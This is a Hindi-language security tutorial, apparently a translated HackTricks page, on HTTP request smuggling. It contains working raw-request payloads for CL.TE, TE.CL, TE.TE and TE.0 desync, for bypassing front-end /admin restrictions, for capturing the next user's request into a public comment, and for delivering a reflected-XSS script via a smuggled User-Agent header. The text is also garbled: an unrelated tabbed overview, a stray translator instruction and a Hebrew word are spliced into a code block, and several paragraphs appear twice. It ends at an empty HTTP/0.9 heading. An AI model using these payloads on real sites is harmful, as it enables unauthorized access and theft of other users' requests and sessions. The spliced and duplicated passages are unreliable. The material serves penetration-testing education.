# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## यह क्या है

यह भेद्यता तब उत्पन्न होती है जब front-end proxies और back-end सर्वर के बीच एक desynchronization होती है जो एक attacker को ऐसा HTTP request भेजने की अनुमति देती है जिसे front-end proxies (load balance/reverse-proxy) द्वारा एक single request के रूप में और back-end सर्वर द्वारा 2 request के रूप में interpret किया जाता है।\
इससे एक user अगले request को modify कर सकता है जो उसके बाद back-end server तक पहुँचती है।

### सिद्धांत

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> यदि कोई संदेश Transfer-Encoding header field और Content-Length header field दोनों के साथ प्राप्त होता है, तो बाद वाले को अनदेखा किया जाना चाहिए।

**Content-Length**

> Content-Length entity header दर्शाता है कि entity-body का आकार, बाइट्स में, recipient को भेजा गया है।

**Transfer-Encoding: chunked**

> Transfer-Encoding header payload body को सुरक्षित रूप से transfer करने के लिए उपयोग किए जाने वाले encoding के रूप को निर्दिष्ट करता है।\
> Chunked का अर्थ है कि बड़े डेटा को chunks की एक श्रृंखला में भेजा जाता है।

### वास्तविकता

Front-End (एक load-balance / Reverse Proxy) एक header (Content-Length या Transfer-Encoding) को process करता है और Back-end server दूसरे header को process करता है, जिससे दोनों प्रणालियों के बीच desynchronization होता है।\
यह बहुत गंभीर हो सकता है क्योंकि एक attacker reverse proxy को एक ऐसा request भेज सकेगा जिसे back-end server दो अलग requests के रूप में interpret करेगा। इस तकनीक का खतरा इस बात में है कि back-end server द्वारा inject की गई दूसरी request को ऐसा माना जाएगा मानो वह अगले client से आई हो और उस client का वास्तविक request inject की गई request का हिस्सा बन जाएगा।

### विशेषताएँ

याद रखें कि HTTP में एक new line character 2 बाइट्स से बना होता है:

- **Content-Length**: यह header request के body के बाइट्स की संख्या दर्शाने के लिए एक decimal number का उपयोग करता है। body के अंत की उम्मीद आखिरी character में होती है, request के अंत में नया लाइन होना आवश्यक नहीं है।
- **Transfer-Encoding:** यह header body में अगले chunk के आकार को दर्शाने के लिए hexadecimal number का उपयोग करता है। chunk को एक new line के साथ समाप्त होना चाहिए लेकिन यह new line length indicator में गिना नहीं जाता। इस transfer method का अंत size 0 के chunk से होना चाहिए जिसके बाद 2 new lines हों: `0`
- **Connection**: मेरे अनुभव के अनुसार request Smuggling के पहले request पर **`Connection: keep-alive`** उपयोग करने की सिफारिश की जाती है।

## Basic Examples

> [!TIP]
> जब इसे Burp Suite से exploit करने की कोशिश करें तो repeater में **`Update Content-Length` और `Normalize HTTP/1 line endings`** को disable कर दें क्योंकि कुछ gadgets newlines, carriage returns और malformed content-lengths का दुरुपयोग करते हैं।

HTTP request smuggling हमले ambiguous requests भेजकर तैयार किए जाते हैं जो front-end और back-end सर्वरों के बीच `Content-Length` (CL) और `Transfer-Encoding` (TE) headers की व्याख्या में अंतर का शोषण करते हैं। ये हमले अलग-अलग रूपों में प्रकट हो सकते हैं, मुख्यतः **CL.TE**, **TE.CL**, और **TE.TE** के रूप में। प्रत्येक प्रकार यह दर्शाता है कि front-end और back-end सर्वर इन headers को किस तरह प्राथमिकता देते हैं। कमजोरियाँ तब उत्पन्न होती हैं जब सर्वर एक ही request को अलग-अलग तरीकों से process करते हैं, जिससे अप्रत्याशित और संभावित रूप से malicious परिणाम होते हैं।

### Vulnerability Types के बुनियादी उदाहरण

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> ऊपर की तालिका में आपको TE.0 technique भी जोड़नी चाहिए, यह CL.0 technique की तरह है पर Transfer Encoding का उपयोग करती है।

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** request को `Content-Length` header के आधार पर process करता है।
- **Back-End (TE):** request को `Transfer-Encoding` header के आधार पर process करता है।
- **Attack Scenario:**

- attacker ऐसा request भेजता है जहाँ `Content-Length` header का मान वास्तविक content length से मेल नहीं खाता।
- front-end server `Content-Length` मान के आधार पर पूरे request को back-end को फॉरवर्ड करता है।
- back-end server `Transfer-Encoding: chunked` header के कारण request को chunked के रूप में process करता है, और शेष डेटा को एक अलग, subsequent request के रूप में interpret कर देता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** request को `Transfer-Encoding` header के आधार पर process करता है।
- **Back-End (CL):** request को `Content-Length` header के आधार पर process करता है।
- **Attack Scenario:**

- attacker एक chunked request भेजता है जहाँ chunk size (`7b`) और वास्तविक content length (`Content-Length: 4`) मेल नहीं खाते।
- front-end server `Transfer-Encoding` का सम्मान करते हुए पूरे request को back-end को भेजता है।
- back-end server `Content-Length` के अनुसार केवल request के शुरुआती भाग (`7b` bytes) को process करता है, शेष भाग अनजाने में subsequent request का हिस्सा बन जाता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** दोनों `Transfer-Encoding` को सपोर्ट करते हैं, लेकिन एक को obfuscation के जरिए इसे न पहचानने के लिए trick किया जा सकता है।
- **Attack Scenario:**

- attacker obfuscated `Transfer-Encoding` headers के साथ request भेजता है।
- जिस server (front-end या back-end) को obfuscation पहचानने में विफलता होती है, वह CL.TE या TE.CL vulnerability का शोषण होने दे सकता है।
- एक server द्वारा न process किया गया request का भाग subsequent request का हिस्सा बन जाता है, जिससे smuggling होता है।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- दोनों सर्वर केवल `Content-Length` header के आधार पर request को process करते हैं।
- यह scenario सामान्यतः smuggling नहीं पैदा करता क्योंकि दोनों सर्वर request length की व्याख्या में aligned होते हैं।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- उन परिस्थितियों को संदर्भित करता है जहाँ `Content-Length` header मौजूद है और उसका मान शून्य से अलग है, यह दर्शाता है कि request body में सामग्री है। back-end `Content-Length` header को अनदेखा कर देता है (जिसे 0 माना जाता है), पर front-end इसे parse करता है।
- यह समझने और smuggling attacks बनाने में महत्वपूर्ण है क्योंकि यह प्रभावित करता है कि सर्वर request के अंत का निर्णय कैसे लेते हैं।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- पिछले वाले की तरह पर TE का उपयोग करते हुए।
- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Example**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### वेब सर्वर को तोड़ना

यह तकनीक उन परिदृश्यों में भी उपयोगी है जहाँ प्रारंभिक **HTTP डेटा पढ़ते समय वेब सर्वर को तोड़ा जा सके** पर **कनेक्शन बंद किए बिना**। इस तरह, HTTP अनुरोध की **बॉडी** अगले **HTTP अनुरोध** के रूप में मानी जाएगी।

उदाहरण के लिए, जैसा कि [**this writeup**](https://mizu.re/post/twisty-python), में बताया गया है, Werkzeug में कुछ **Unicode** characters भेजना संभव था और इससे सर्वर **ब्रेक** हो जाता था। हालांकि, यदि HTTP कनेक्शन हेडर **`Connection: keep-alive`** के साथ बनाया गया था, तो अनुरोध की बॉडी पढ़ी नहीं जाएगी और कनेक्शन खुला रहेगा, इसलिए अनुरोध की **बॉडी** अगले **HTTP अनुरोध** के रूप में माना जाएगा।

#### hop-by-hop headers के जरिए मजबूर करना

hop-by-hop headers का दुरुपयोग करके आप proxy को संकेत दे सकते हैं कि वह **Content-Length या Transfer-Encoding हेडर को हटा दे ताकि HTTP request smuggling का दुरुपयोग संभव हो सके।**
```
Connection: Content-Length
```
अधिक जानकारी के लिए **hop-by-hop headers** देखें:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## HTTP Request Smuggling का पता लगाना

HTTP request smuggling vulnerabilities की पहचान अक्सर timing techniques के द्वारा की जा सकती है, जो यह देखती हैं कि manipulated requests पर server को प्रतिक्रिया देने में कितना समय लगता है। ये तकनीकें विशेष रूप से CL.TE और TE.CL vulnerabilities का पता लगाने में उपयोगी हैं। इन तरीकों के अलावा भी अन्य रणनीतियाँ और टूल हैं जो ऐसी vulnerabilities खोजने के लिए उपयोग किए जा सकते हैं:

### Finding CL.TE Vulnerabilities Using Timing Techniques

- **Method:**

- ऐसा request भेजें जो, यदि application vulnerable है, तो back-end server को अतिरिक्त डेटा के लिए प्रतीक्षा करने पर मजबूर कर देगा।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Observation:**
- front-end server request को `Content-Length` के आधार पर प्रोसेस करता है और संदेश को समय से पहले काट देता है।
- back-end server, चंकेड संदेश की उम्मीद करता है, अगले chunk के आने की प्रतीक्षा करता है जो कभी नहीं आता, जिससे देरी होती है।

- **Indicators:**
- response में timeouts या लंबे delays।
- back-end server से 400 Bad Request error मिलना, कभी-कभी विस्तृत server जानकारी के साथ।

### Finding TE.CL Vulnerabilities Using Timing Techniques

- **Method:**

- ऐसा request भेजें जो, यदि application vulnerable है, तो back-end server को अतिरिक्त डेटा के लिए प्रतीक्षा करने पर मजबूर कर देगा।
- **Example:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Observation:**
- front-end server request को `Transfer-Encoding` के आधार पर प्रोसेस करता है और पूरा संदेश फॉरवर्ड कर देता है।
- back-end server, `Content-Length` के आधार पर संदेश की उम्मीद करता है और अतिरिक्त डेटा की प्रतीक्षा करता है जो कभी नहीं आता, जिससे देरी होती है।

### Other Methods to Find Vulnerabilities

- **Differential Response Analysis:**
- थोड़ा अलग-अलग वेरिएंट वाले request भेजें और देखें कि क्या server के responses किसी अनअपेक्षित तरीके से भिन्न होते हैं, जो parsing discrepancy का संकेत देता है।
- **Using Automated Tools:**
- Burp Suite's 'HTTP Request Smuggler' extension जैसे tools ambiguous requests के विभिन्न रूप भेजकर और responses का विश्लेषण करके इन vulnerabilities का स्वतः परीक्षण कर सकते हैं।
- **Content-Length Variance Tests:**
- ऐसे requests भेजें जिनमें `Content-Length` के मान वास्तविक content length से मेल नहीं खाते और देखें कि server उन mismatches को कैसे हैंडल करता है।
- **Transfer-Encoding Variance Tests:**
- ऐसे requests भेजें जिनमें obfuscated या malformed `Transfer-Encoding` headers हों और देखें कि front-end और back-end servers उन परिवर्तनों पर कितना अलग प्रतिक्रिया करते हैं।

### HTTP Request Smuggling Vulnerability Testing

Timing techniques की प्रभावशीलता की पुष्टि करने के बाद, यह सुनिश्चित करना आवश्यक है कि client requests को वास्तव में manipulate किया जा सकता है। एक सरल तरीका यह है कि अपनी requests को poison करने का प्रयास करें, उदाहरण के लिए, `/` पर किया गया request 404 response दे। पहले Discuss किए गए `CL.TE` और `TE.CL` उदाहरण [Basic Examples](#basic-examples) में दिखाते हैं कि कैसे client के request को poison करके 404 response करवा सकते हैं, जबकि client किसी अन्य resource तक पहुँचने का प्रयास कर रहा होता है।

**मुख्य विचार**

जब आप दूसरों के requests में हस्तक्षेप करके request smuggling की टेस्टिंग कर रहे हों, तो ध्यान रखें:

- **Distinct Network Connections:** "attack" और "normal" requests अलग network connections पर भेजने चाहिए। दोनों के लिए एक ही connection का उपयोग करना vulnerability की पुष्टि नहीं करता।
- **Consistent URL and Parameters:** दोनों requests के लिए समान URL और parameter names उपयोग करने का प्रयास करें। आधुनिक applications अक्सर URL और parameters के आधार पर requests को विशिष्ट back-end servers पर route करती हैं। मेल खाने से यह संभावना बढ़ती है कि दोनों requests को एक ही server द्वारा प्रोसेस किया जाएगा, जो successful attack के लिए जरूरी है।
- **Timing and Racing Conditions:** "normal" request, जो "attack" request के हस्तक्षेप का पता लगाने के लिए है, अन्य concurrent application requests के साथ प्रतिस्पर्धा करता है। इसलिए "normal" request को तुरंत "attack" request के बाद भेजें। व्यस्त applications में conclusive पुष्टि के लिए कई बार प्रयास आवश्यक हो सकते हैं।
- **Load Balancing Challenges:** front-end servers जो load balancers के रूप में कार्य करते हैं, requests को विभिन्न back-end systems पर बाँट सकते हैं। अगर "attack" और "normal" requests अलग systems पर पहुँच जाएँ, तो attack सफल नहीं होगा। इस load balancing वजह से vulnerability की पुष्टि के लिए कई प्रयास करने पड़ सकते हैं।
- **Unintended User Impact:** अगर आपका attack किसी अन्य उपयोगकर्ता के request (आपके भेजे गए "normal" request के अलावा) पर प्रभाव डालता है, तो यह संकेत है कि आपका attack किसी अन्य application user को प्रभावित कर गया। लगातार परीक्षण अन्य उपयोगकर्ताओं को प्रभावित कर सकता है, इसलिए सावधानी बरतें।

## HTTP/1.1 pipelining के artifacts और genuine request smuggling में अंतर

Connection reuse (keep-alive) और pipelining आसानी से उन testing tools में "smuggling" के भ्रम पैदा कर सकते हैं जो एक ही socket पर कई requests भेजते हैं। harmless client-side artifacts को real server-side desync से अलग करना सीखें।

### क्यों pipelining क्लासिक false positives बनाता है

HTTP/1.1 एक single TCP/TLS connection को reuse करता है और उसी stream पर requests और responses को concatenate करता है। pipelining में, client कई requests को लगातार भेजता है और in-order responses पर निर्भर रहता है। एक सामान्य false-positive यह है कि एक malformed CL.0-style payload को एक ही connection पर दो बार resend किया जाए:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
# HTTP request smuggling

{#tabs}
{#tab name="अवलोकन"}
HTTP request smuggling एक ऐसी technique है जो backend servers या intermediaries के बीच parsing असंगतियों का फायदा उठाती है। यह अक्सर तब सफल होता है जब किसी proxy या front-end और backend के बीच Content-Length और Transfer-Encoding को अलग-अलग तरीके से interpret किया जाता है। सफल smuggling से request hijacking, cache poisoning, और authentication bypass जैसे असर हो सकते हैं।
{#endtab}

{#tab name="डिटेक्शन"}
- बेसिक चेक: अलग-अलग combinations של Content-Length और Transfer-Encoding वाले requests भेजें और server की प्रतिक्रियाओं का निरीक्षण करें।
- असमान parsing के लक्षण: unexpected status codes, truncated responses, या दूसरे users के responses में अतिरिक्त data।
- automated tools: कई scanners HTTP request smuggling के लिए परीक्षण करते हैं, पर manual परीक्षण ज़्यादा reliable होता है।
{#endtab}

{#tab name="Exploit उदाहरण"}
नीचे एक सामान्य उदाहरण है जहाँ Content-Length और Transfer-Encoding दोनों मौजूद हैं। ध्यान रखें कि code block को translate न करें।

```http
POST / HTTP/1.1
Host: vulnerable
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable
```

ऊपर के payload में यदि proxy Transfer-Encoding को पहले process करता है और backend Content-Length को पहले, तो backend एक अतिरिक्त GET request को अलग से interpret कर सकता है, जिससे smuggled request execute हो सकता है।
{#endtab}
{#endtabs}

अधिक पढ़ने के लिए देखें: tests/README.md
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
यदि सर्वर malformed `Content_Length` को अनदेखा कर देता है, तो कोई FE↔BE desync नहीं होता। reuse के साथ, आपका client वास्तव में यह byte-stream भेजता है, जिसे server ने दो स्वतंत्र requests के रूप में parsed किया:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
प्रभाव: कोई नहीं। आपने बस अपने client को server framing से desynced कर दिया।

> [!TIP]
> Burp मॉड्यूल जो reuse/pipelining पर निर्भर हैं: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus tests: pipelining or real desync?

1. Disable reuse and re-test
- Burp Intruder/Repeater में, HTTP/1 reuse बंद करें और "Send group in sequence" से बचें।
- Turbo Intruder में, `requestsPerConnection=1` और `pipeline=False` सेट करें।
- यदि व्यवहार गायब हो जाता है, तो संभवतः यह client-side pipelining था, जब तक कि आप connection-locked/stateful targets या client-side desync के साथ नहीं काम कर रहे हों।
2. HTTP/2 nested-response check
- एक HTTP/2 request भेजें। यदि response body में एक पूरा nested HTTP/1 response शामिल है, तो आपने pure client artifact के बजाय backend parsing/desync bug साबित कर दिया है।
3. Partial-requests probe for connection-locked front-ends
- कुछ FEs केवल तब upstream BE connection reuse करते हैं जब client ने अपना reuse किया हो। FE व्यवहार जो client reuse को mirror करता है, पहचानने के लिए partial-requests का उपयोग करें।
- connection-locked technique के लिए PortSwigger "Browser‑Powered Desync Attacks" देखें।
4. State probes
- एक ही TCP connection पर first- vs subsequent-request के बीच के अंतर खोजें (first-request routing/validation)।
- Burp "HTTP Request Smuggler" में एक connection‑state probe शामिल है जो इस प्रक्रिया को स्वचालित करता है।
5. Visualize the wire
- reuse और partial requests के साथ प्रयोग करते समय concatenation और message framing को सीधे निरीक्षण करने के लिए Burp "HTTP Hacker" extension का उपयोग करें।

### Connection‑locked request smuggling (reuse-required)

कुछ front-ends केवल तब upstream connection reuse करते हैं जब client ने अपना reuse किया हो। वास्तविक smuggling मौजूद हो सकती है पर यह client-side reuse पर निर्भर होती है। भेद करने और प्रभाव साबित करने के लिए:
- server-side bug साबित करें
- HTTP/2 nested-response check का उपयोग करें, या
- दिखाने के लिए partial-requests का उपयोग करें कि FE केवल तभी upstream reuse करता है जब client करता है।
- यह दिखाएँ कि वास्तविक प्रभाव है भले ही direct cross-user socket abuse blocked हो:
  - Cache poisoning: desync के माध्यम से shared caches को poison करें ताकि responses अन्य उपयोगकर्ताओं को प्रभावित करें।
  - Internal header disclosure: FE-injected headers (उदा., auth/trust headers) को reflect करें और auth bypass की ओर pivot करें।
  - Bypass FE controls: restricted paths/methods को front-end से पार smuggle करें।
  - Host-header abuse: host routing quirks के साथ combine करके internal vhosts की ओर pivot करें।
- Operator workflow
  - नियंत्रित reuse के साथ reproduce करें (Turbo Intruder `requestsPerConnection=2`, या Burp Repeater tab group → "Send group in sequence (single connection)")।
  - फिर cache/header-leak/control-bypass primitives से chain करें और cross-user या authorization impact प्रदर्शित करें।

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

यदि आप browser-powered/client-side desync को target कर रहे हैं, तो malicious request browser द्वारा cross-origin भेजने योग्य होना चाहिए। Header obfuscation tricks काम नहीं करेंगी। navigation/fetch के माध्यम से पहुँचने योग्य primitives पर फ़ोकस करें, और फिर downstream components द्वारा responses के reflect या cache होने पर pivot करें — जैसे cache poisoning, header disclosure, या front-end control bypass।

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): low-level HTTP व्यवहार और socket concatenation को उजागर करता है।
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: `requestsPerConnection` के माध्यम से connection reuse पर सटीक नियंत्रण।
- Burp HTTP Request Smuggler: एक connection‑state probe शामिल है जो first‑request routing/validation को पकड़ता है।

> [!NOTE]
> reuse-only effects को गैर-समस्याओं के रूप में मानें जब तक कि आप server-side desync साबित न कर सकें और ठोस प्रभाव (poisoned cache artifact, leaked internal header जो privilege bypass सक्षम करे, bypassed FE control, आदि) प्रस्तुत न कर सकें।

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

कभी-कभी front-end proxies security measures लागू करते हैं और आने वाले requests की जांच करते हैं। हालांकि, इन measures को HTTP Request Smuggling का उपयोग करके बायपास किया जा सकता है, जिससे restricted endpoints तक unauthorized access हो सके। उदाहरण के लिए, बाहरी रूप से `/admin` तक पहुँच वर्जित हो सकती है और front-end proxy ऐसे प्रयासों को सक्रिय रूप से ब्लॉक कर सकता है। फिर भी, यह proxy smuggled HTTP request के अंदर embedded requests की जाँच न करके इन प्रतिबंधों को बायपास करने के लिए एक loophole छोड़ सकता है।

निम्न उदाहरणों पर विचार करें जो दिखाते हैं कि HTTP Request Smuggling का उपयोग front-end security controls को बायपास करने के लिए कैसे किया जा सकता है, विशेष रूप से `/admin` path को लक्षित करके जो सामान्यतः front-end proxy द्वारा सुरक्षित होता है:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
In the CL.TE attack में प्रारंभिक request के लिए `Content-Length` header का उपयोग किया जाता है, जबकि बाद वाला embedded request `Transfer-Encoding: chunked` header का उपयोग करता है। front-end proxy प्रारंभिक `POST` request को process करता है लेकिन embedded `GET /admin` request का निरीक्षण करने में विफल रहता है, जिससे `/admin` path तक अनधिकृत पहुँच संभव हो जाती है।

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
इसके विपरीत, TE.CL attack में, प्रारंभिक `POST` request `Transfer-Encoding: chunked` का उपयोग करती है, और उसके बाद embedded request को `Content-Length` header के आधार पर process किया जाता है। CL.TE attack की तरह, front-end proxy smuggled `GET /admin` request को अनदेखा कर देता है, जिससे अनजाने में restricted `/admin` path तक access मिल जाता है।

### फ्रंट-एंड अनुरोध पुनर्लेखन का खुलासा <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Applications अक्सर आने वाले requests को back-end server को भेजने से पहले बदलने के लिए **front-end server** का उपयोग करते हैं। एक सामान्य परिवर्तन headers जोड़ना है, जैसे `X-Forwarded-For: <IP of the client>`, ताकि क्लाइंट का IP back-end तक पहुँचाया जा सके। इन परिवर्तनों को समझना महत्वपूर्ण हो सकता है, क्योंकि इससे आप सुरक्षा उपायों को बायपास करने या छिपी हुई जानकारी/endpoints का पता लगाने के तरीके उजागर कर सकते हैं।

जांचने के लिए कि proxy किसी request को कैसे बदलता है, एक ऐसा POST parameter ढूंढें जिसे back-end response में echo करता है। फिर, इस parameter को आख़िर में इस्तेमाल करते हुए एक request बनाएं, जो निम्न के समान हो:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In this structure, subsequent request components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose the headers of the subsequent request.

इस संरचना में, बाद के अनुरोध के घटक `search=` के बाद जोड़े जाते हैं, जो प्रतिक्रिया में परावर्तित होने वाला पैरामीटर है। यह परावर्तन अगले अनुरोध के headers को उजागर कर देगा।

It's important to align the `Content-Length` header of the nested request with the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will truncate the reflected data, while too high a value can cause the request to error out.

nested अनुरोध के `Content-Length` header को वास्तविक सामग्री की लंबाई के साथ मेल खाना महत्वपूर्ण है। छोटे मान से शुरू करके धीरे‑धीरे बढ़ाना सलाहयोग्य है, क्योंकि बहुत कम मान परावर्तित डेटा को कट कर देगा, जबकि बहुत अधिक मान अनुरोध को error करवा सकता है।

This technique is also applicable in the context of a TE.CL vulnerability, but the request should terminate with `search=\r\n0`. Regardless of the newline characters, the values will append to the search parameter.

यह तकनीक TE.CL vulnerability के संदर्भ में भी लागू होती है, लेकिन अनुरोध को `search=\r\n0` पर समाप्त करना चाहिए। newline characters की परवाह किए बिना, मान search पैरामीटर में जोड़ दिए जाएंगे।

This method primarily serves to understand the request modifications made by the front-end proxy, essentially performing a self-directed investigation.

यह विधि मुख्यतः front-end proxy द्वारा किए गए अनुरोध संशोधनों को समझने के लिए है, मौलिक रूप से एक स्वयं-निर्देशित जांच करती है।

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

It's feasible to capture the requests of the next user by appending a specific request as the value of a parameter during a POST operation. Here's how this can be accomplished:

POST ऑपरेशन के दौरान किसी पैरामीटर के मान के रूप में एक विशिष्ट request जोड़कर अगले उपयोगकर्ता के अनुरोधों को capture करना संभव है। इसे इस प्रकार किया जा सकता है:

By appending the following request as the value of a parameter, you can store the subsequent client's request:

निम्नलिखित request को किसी पैरामीटर के मान के रूप में जोड़कर आप बाद वाले क्लाइंट के अनुरोध को स्टोर कर सकते हैं:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
इस परिदृश्य में, **टिप्पणी पैरामीटर** का उद्देश्य सार्वजनिक रूप से सुलभ पेज पर पोस्ट के टिप्पणी सेक्शन के भीतर सामग्री संग्रहीत करना है। परिणामस्वरूप, बाद वाले अनुरोध की सामग्री एक टिप्पणी के रूप में दिखाई देगी।

हालाँकि, इस तकनीक की सीमाएँ हैं। सामान्यतः, यह केवल उस पैरामीटर डिलिमिटर तक ही डेटा कैप्चर करती है जो smuggled request में उपयोग किया गया है। URL-encoded form submissions के लिए, यह डिलिमिटर `&` कैरेक्टर है। इसका मतलब है कि पीड़ित उपयोगकर्ता के अनुरोध से कैप्चर किया गया कंटेंट पहले `&` पर रुक जाएगा, जो कभी-कभी query string का हिस्सा भी हो सकता है।

इसके अलावा, ध्यान देने योग्य है कि यह तरीका TE.CL vulnerability के साथ भी काम करता है। ऐसे मामलों में, request को `search=\r\n0` पर समाप्त होना चाहिए। newline characters की परवाह किए बिना, मान search पैरामीटर में जोड़ दिए जाएंगे।

### HTTP request smuggling का उपयोग reflected XSS का शोषण करने के लिए

HTTP Request Smuggling का उपयोग उन वेब पेजों को exploit करने के लिए किया जा सकता है जो **Reflected XSS** के लिए कमजोर हैं, और यह महत्वपूर्ण फायदे देता है:

- लक्षित उपयोगकर्ताओं के साथ इंटरैक्शन **आवश्यक नहीं है**।
- यह अनुरोध के उन हिस्सों में XSS का exploit करने की अनुमति देता है जो सामान्यतः **अप्राप्य** होते हैं, जैसे HTTP request headers।

ऐसी स्थितियों में जहाँ कोई वेबसाइट User-Agent header के माध्यम से Reflected XSS के प्रति संवेदनशील हो, निम्नलिखित payload यह दिखाता है कि इस vulnerability को कैसे exploit किया जा सकता है:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
यह payload इस vulnerability का फायदा उठाने के लिए इस तरह संरचित है:

1. एक सामान्य दिखने वाला `POST` request शुरू करना, जिसमें smuggling की शुरुआत का संकेत देने के लिए `Transfer-Encoding: chunked` header होता है।
2. इसके बाद `0` भेजना, जो chunked message body के अंत को दर्शाता है।
3. फिर, एक smuggled `GET` request डाला जाता है, जिसमें `User-Agent` header में `<script>alert(1)</script>` जैसे script का injection किया जाता है, जो server द्वारा इस अगले request को process करते समय XSS को ट्रिगर करता है।

smuggling के जरिए `User-Agent` को manipulate करके, यह payload सामान्य request constraints को बायपास कर देता है, और इस तरह non-standard परंतु प्रभावी तरीके से Reflected XSS vulnerability का फायदा उठाता है।

#### HTTP/0.9

> [!CAUTION]
